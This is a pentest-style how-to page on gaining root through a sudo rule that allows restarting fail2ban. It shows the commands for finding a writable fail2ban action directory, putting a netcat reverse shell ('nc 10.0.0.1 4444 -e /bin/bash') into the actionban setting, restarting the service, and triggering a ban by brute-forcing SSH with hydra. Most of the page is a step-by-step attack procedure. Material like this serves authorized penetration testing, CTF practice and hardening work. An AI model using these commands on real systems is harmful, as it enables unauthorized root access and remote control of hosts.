# Sudo Fail2ban Privilege Escalation

The `sudo fail2ban` command might be vulnerable to privilege escalation (PrivEsc).

**Fail2ban** is an intrusion prevention software framework.\
It prevents against brute force attacks.

### Investigation <a href="#investigation" id="investigation"></a>

```
sudo -l

(root) NOPASSWD: /etc/init.d/fail2ban restart
```

If we can execute **"fail2ban"** as root, we can gain access to privileges by modifying the configuration file.\
We need to check if the config file is writable.

```
find /etc -writable -ls 2>/dev/null

4 drwxrwx--- 2 root security  4096 Oct 16 08:57 /etc/fail2ban/action.d
```

Look inside of **"/etc/fail2ban/jail.conf"** to know more about how fail2ban is configured.

```shellscript
less /etc/fail2ban/jail.conf

# ---------------------------------------------

# output

...
# "bantime" is the number of seconds that a host is banned.
bantime  = 10s

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10s

# "maxretry" is the number of failures before a host get banned.
maxretry = 5
...
```

### Exploitation <a href="#exploitation" id="exploitation"></a>

#### 1. Modify the Configuration File <a href="#id-1-modify-the-configuration-file" id="id-1-modify-the-configuration-file"></a>

For privilege escalation, we need to update the **"iptables-multiport.conf"**.\
Specifically, insert a payload to one of the following values.

* **actionstart**
* **actionstop**
* **actioncheck**
* **actionban**
* **actionunban**

Here update the value of **actionban** which triggers ban on multiple login attempts.

*   **Method 1**

    Copy **iptables-multiport.conf** to the current user's home directory.

    ```
    ls -al /etc/fail2ban/action.d/iptables-multiport.conf
    # copy this file into the home directory for editing the content
    cp /etc/fail2ban/action.d/iptables-multiport.conf ~
    ```

    Now modify the file.

    ```
    vim ~/iptables-multiport.conf
    ```

    We insert a reverse shell payload into the **actionban**.

    ```
    actionban = /usr/bin/nc 10.0.0.1 4444 -e /bin/bash
    ```

    Then move back the config file to the original one.

    ```
    mv ~/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
    ```
*   **Method 2**

    Fail2ban parses .local files in the action.d directory after the .conf files, and any settings in the .local files override user changes made in the .conf files.

    ```
    # cp iptables-multiport.conf in the same directory with .local extension iptables-multiport.local
    cp /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.local
    ```

    We insert a reverse shell payload into the **actionban**.

    ```
    actionban = /usr/bin/nc 10.0.0.1 4444 -e /bin/bash
    ```

To apply the new configuration, restart it as root.

```
sudo /etc/init.d/fail2ban restart
```

#### 2. Trigger the Action <a href="#id-2-trigger-the-action" id="id-2-trigger-the-action"></a>

Start a listener in local machine.

```
nc -lvnp 4444
```

Try to login with the wrong passwords multiple times until we will get banned.\
So that to, **hydra** is useful.

```
hydra -l root -P passwords.txt <target-ip> ssh
```

After a short time, you will get a root shell via listener.
